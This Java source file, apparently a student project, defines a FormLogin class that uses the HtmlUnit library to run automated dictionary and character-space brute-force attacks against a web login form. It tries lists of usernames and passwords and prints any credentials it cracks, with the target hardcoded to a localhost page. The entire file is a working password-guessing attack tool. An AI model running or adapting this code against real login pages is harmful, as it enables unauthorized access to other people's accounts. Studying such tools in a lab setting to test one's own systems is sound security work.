package com.company;

import com.gargoylesoftware.htmlunit.Page;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.*;

import java.io.IOException;
import java.lang.reflect.Array;
import java.rmi.server.ExportException;
import java.util.ArrayList;

public class FormLogin {

    String url;

    String username;
    ArrayList<String> usernames;
    ArrayList<String> dictionary;
    int maxLength;
    String characterSpace;

    boolean manyUsernames;

    WebClient client;
    HtmlPage page;
    HtmlForm form;

    boolean isBrute;
    boolean found;

    public FormLogin(String url, String username, ArrayList<String> dictionary) {
        this.username = username;
        this.dictionary = dictionary;
        this.url = url;
        this.isBrute = false;
    }

    public FormLogin(String url, ArrayList<String> dictionary, ArrayList<String> usernames) {
        this.username = username;
        this.dictionary = dictionary;
        this.url = url;
        this.usernames = usernames;
        manyUsernames = true;
        this.isBrute = false;
    }

    public FormLogin(String url, String username, String characterSpace, int maxLength) {
        this.username = username;
        this.url = url;
        this.characterSpace = characterSpace;
        this.maxLength = maxLength;
        this.isBrute = true;
    }

    public FormLogin(String url, ArrayList<String> usernames, String characterSpace, int maxLength) {
        this.usernames = usernames;
        this.url = url;
        this.characterSpace = characterSpace;
        this.maxLength = maxLength;
        this.isBrute = true;
        manyUsernames = true;
    }

//    public FormLogin(String, url )

    public void setup() {
        client = new WebClient();

        try {
            HtmlPage page = (HtmlPage) client.getPage(url);
            form = page.getFormByName("login");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void login() {

        if (isBrute) {
            bruteLogin();

        } else if (manyUsernames) {
            for (String n : usernames) {
                username = n;
                startAttempts();
            }
        } else {
            startAttempts();
        }
    }

    public void bruteLogin() {

        found = false;
        if (manyUsernames) {

            for (String n : usernames) {
                username = n;

                for (int i = 0; i < maxLength; i++) {
                    if (!found) {
                        startBruteAttempts("", i + 1);
                    }
                }

            }
        } else {
            for (int i = 0; i < maxLength; i++) {
                if (!found) {
                    startBruteAttempts("", i + 1);
                }
            }
        }
    }

    public void startBruteAttempts(String curr, int length) {

        try {

            form.getInputByName("username").setValueAttribute(username);

            form.getInputByName("password").setValueAttribute(curr);

            HtmlElement button = form.getElementsByAttribute("input", "value", "Submit").get(0);

            Page result = button.click();
            String resultUrl = result.getUrl().toString();

            if (resultUrl.equals("http://localhost/3200-project/index.php")) {
                System.out.println("Failed attempt with: " + username + ", " + curr);

            } else {
                System.out.println("Success with username " + username + "! " + "Password is " + curr);
                found = true;
                return;
            }
        } catch (IOException e) {

        }


        // If the current string has reached it's maximum length
        if (curr.length() == length) {
            // Else add each letter from the alphabet to new strings and process these new strings again
        } else {
            for (int i = 0; i < characterSpace.length(); i++) {
                String oldCurr = curr;
                curr += characterSpace.charAt(i);
                startBruteAttempts(curr, length);
                curr = oldCurr;
            }
        }
    }

    public void startAttempts() {
        for (int i = 0; i < dictionary.size(); i++) {

            try {

                String password = dictionary.get(i);

                form.getInputByName("username").setValueAttribute(username);

                form.getInputByName("password").setValueAttribute(password);

                HtmlElement button = form.getElementsByAttribute("input", "value", "Submit").get(0);

                Page result = button.click();
                String resultUrl = result.getUrl().toString();

                if (resultUrl.equals("http://localhost/3200-project/index.php")) {
                    System.out.println("Failed attempt with: " + username + ", " + password);

                } else {
                    System.out.println("Success with username " + username + "! " + "Password is " + password);
                    break;
                }


            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }


}
